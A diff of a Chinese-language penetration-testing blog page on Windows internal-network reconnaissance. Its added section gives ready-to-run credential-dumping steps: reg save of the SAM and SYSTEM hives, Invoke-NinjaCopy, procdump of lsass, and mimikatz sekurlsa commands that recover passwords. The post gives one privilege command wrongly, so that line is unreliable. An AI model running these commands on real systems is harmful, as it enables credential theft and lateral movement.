@@ -156,10 +156,10 @@
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h2 id="常见的内网信息收集方式"><a href="#常见的内网信息收集方式" class="headerlink" title="常见的内网信息收集方式"></a><strong>常见的内网信息收集方式</strong></h2><hr>
+                <h2 id="Windows内网信息收集方式"><a href="#Windows内网信息收集方式" class="headerlink" title="Windows内网信息收集方式"></a><strong>Windows内网信息收集方式</strong></h2><hr>
 <p>​    首先我们需要知道Windoes的认证方式有<strong><u>Kerberos</u></strong>，<strong><u>NTLM</u></strong>，<strong><u>Digest SSP</u></strong>三种，其工作原理将在之后的博客中专门讲述。</p>
 <blockquote>
-<h4 id="Windoes下信息收集"><a href="#Windoes下信息收集" class="headerlink" title="Windoes下信息收集"></a>Windoes下信息收集</h4></blockquote>
+<h4 id="Windoes下自带命令信息收集"><a href="#Windoes下自带命令信息收集" class="headerlink" title="Windoes下自带命令信息收集"></a>Windoes下自带命令信息收集</h4></blockquote>
 <p>​    <strong>systeminfo：</strong>显示有关计算机及其操作系统的详细配置信息，包括操作系统配置，安全信息，产品ID和硬件属性(如RAM，硬盘空间和网卡)</p>
 <p>​    <strong>whoami：</strong>显示当前登陆到本地系统用户的用户，组和权限信息。如果没有参数使用，此命令会显示当前的域和用户名</p>
 <p>​        whoami /user：查看当前用户的用户名和sid</p>
@@ -190,12 +190,28 @@
 <p>​        netstat -p tcp：显示tcp连接</p>
 <p>​    <strong>Net share：</strong>管理共享资源</p>
 <p>​        net share c$：查看c$共享的信息</p>
-<h5 id="凭证收集-Windoes账户密码"><a href="#凭证收集-Windoes账户密码" class="headerlink" title="凭证收集-Windoes账户密码"></a><strong>凭证收集-Windoes账户密码</strong></h5><p>​    Windows用户的密码加密后一般有两种形式：NTLM Hash和    LM Hash，从wv和2008开始，LM Hash被取消，这些hash有两个存储的地方：对于本地用户，存储在SAM数据库中，对于域用户则存储在域控制器的NTDS.dit数据库中。当用户登录时，这些hash也可能贮存在内存中，能够被我们抓取到。    </p>
+<blockquote>
+<h4 id="凭证收集-Windoes账户密码"><a href="#凭证收集-Windoes账户密码" class="headerlink" title="凭证收集-Windoes账户密码"></a><strong>凭证收集-Windoes账户密码</strong></h4></blockquote>
+<p>​    Windows用户的密码加密后一般有两种形式：NTLM Hash和    LM Hash，从wv和2008开始，LM Hash被取消，这些hash有两个存储的地方：对于本地用户，存储在SAM数据库中，对于域用户则存储在域控制器的NTDS.dit数据库中。当用户登录时，这些hash也可能贮存在内存中，能够被我们抓取到。    </p>
 <p><strong>SAM</strong></p>
 <p>SAM全称安全账户管理器，是Windoes中存储用户密码的数据库文件，用户密码以散列格式存储在注册表配置单元中。这个文件可以在<strong><em>%SystemRoot%/system32/config/SAM</em></strong>中找到，并且挂载在HKLM/SAM上。</p>
-<p><strong>hash提取</strong></p>
 <p><strong>UAC</strong></p>
 <p>UAC这个名字初次听可能会陌生，但是几乎我们所有人都接触过。回想一下，当我们右键某个可执行文件，选择以管理员身份运行，就会弹出一个对话框，语句权限不同，可能要我们输入管理员凭据，也可能询问我们是否允许该程序进行更改。这就是UAC。</p>
+<h5 id="一、提取SAM数据库hash"><a href="#一、提取SAM数据库hash" class="headerlink" title="一、提取SAM数据库hash"></a><strong>一、提取SAM数据库hash</strong></h5><p>方式一：</p>
+<p>使用reg命令保存注册表键</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg  save hklm\sam c:\sam.hive</span><br><span class="line"></span><br><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure>
+<p>方式二：</p>
+<p>使用invoke-NinjaCopy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\invoke-ninjacopy.ps1</span><br><span class="line"></span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM-LocalDestination .\sam.hive</span><br><span class="line"></span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM-LocalDestination .\system.hive</span><br></pre></td></tr></table></figure>
+<p>方式三：</p>
+<p>Vista及以上系统可以打开任务管理器，选择显示所有用户的进程，找到lsass进行右键创建转储文件</p>
+<p>方式四：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe</span><br><span class="line"></span><br><span class="line">procdump.exe -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+<h5 id="二、获取密码"><a href="#二、获取密码" class="headerlink" title="二、获取密码"></a><strong>二、获取密码</strong></h5><p>方式一、二可以直接将获得的两个文件放入Cain中提取密码</p>
+<p>方式三、四获取到内存转储文件后可以使用mimikatz来提取密码。这里需要注意的是，运行mimikatz平台架构要与进行转出的系统兼容，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p>Ps：一般运行mimikatz需要先运行提权命令：kerberos::debug</p>
+<p>​    推荐参考文章：<a href="https://www.freebuf.com/articles/web/176796.html" target="_blank" rel="noopener">运行mimikatz的九种姿势</a></p>
 
             </div>
 
